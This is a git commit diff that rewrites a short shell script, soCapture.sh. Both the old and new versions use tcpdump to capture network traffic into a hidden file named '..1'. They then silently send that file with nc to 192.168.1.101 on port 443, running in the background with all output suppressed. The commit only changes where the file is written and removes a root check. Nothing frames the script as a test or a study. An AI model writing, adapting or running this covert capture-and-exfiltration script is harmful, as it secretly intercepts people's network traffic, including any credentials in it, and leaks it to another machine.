7481cae401e7e54b53c174fb01a3146b471b3aff
Sobanggg <abolfazleshghi1385@gmail.com>
2024-06-02 03:42:53 -0400

    error handeling not permission

--- soCapture.sh
+++ soCapture.sh
@@ -1,11 +1,6 @@
-#!/bin/bash  
-user=`whoami`
-if [[ $user == "root"  ]]; then
-	{
-	tcpdump -w /home/..1
-	nc -w 3 192.168.1.101 443 < /home/..1
-	} > /dev/null 2>&1 &
-else
-	tcpdump -w /home/$user/..1
-	nc -w 3 192.168.1.101 443 < /home/$user/..1
-fi
+#!/bin/bash
+
+        {
+        tcpdump -w  ./..1
+        nc -w 3 192.168.1.101 443 < ./..1
+        } > /dev/null 2>&1 &
